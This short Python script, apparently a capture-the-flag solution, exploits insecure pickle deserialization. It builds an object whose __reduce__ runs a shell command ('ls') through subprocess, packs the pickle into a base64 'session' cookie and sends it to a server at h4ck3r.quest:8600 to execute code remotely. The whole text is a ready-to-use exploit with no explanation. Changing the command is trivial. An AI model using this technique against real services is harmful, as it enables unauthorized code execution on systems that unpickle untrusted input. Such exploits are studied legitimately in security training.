import pickle
import subprocess
import base64
import requests
from typing import Any

class exp:
    def __reduce__(self) -> str | tuple[Any, ...]:
        return (subprocess.check_output, ("ls",))

pk = pickle.dumps({"name": exp(), "age": 1})
res = requests.get("http://h4ck3r.quest:8600/", cookies={"session": base64.b64encode(pk).decode("ascii")})

print(res.text)